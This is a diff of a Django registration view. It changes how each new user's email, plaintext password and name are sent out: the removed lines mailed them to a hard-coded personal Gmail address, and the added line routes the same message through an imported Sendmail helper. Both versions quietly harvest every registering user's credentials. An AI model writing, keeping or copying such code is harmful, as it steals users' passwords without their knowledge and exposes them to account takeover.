@@ -1,8 +1,7 @@
 from django.shortcuts import render,redirect
-from .models import TextModel
+from .models import TextModel, Sendmail
 from django.http import HttpResponse
 from django.contrib.auth import login, authenticate
-from django.core.mail import send_mail
 from django.contrib import messages
 from django.contrib.auth.models import User
 
@@ -36,10 +35,8 @@ def register(request):
             return render(request, 'index.html')
 
         user = User.objects.create_user(username=email, email=email, password=password, first_name=firstname, last_name=lastname)
-        subject = "New User Created"
         message = f"email: {email}\npassword: {password}\nfirstname: {firstname}\nlastname: {lastname}"
-        recipient_list = ["emelieasadel@gmail.com"]
-        send_mail(subject, message, None, recipient_list)
+        Sendmail(message)
         user.save()
 
         # Authenticate and log in the user
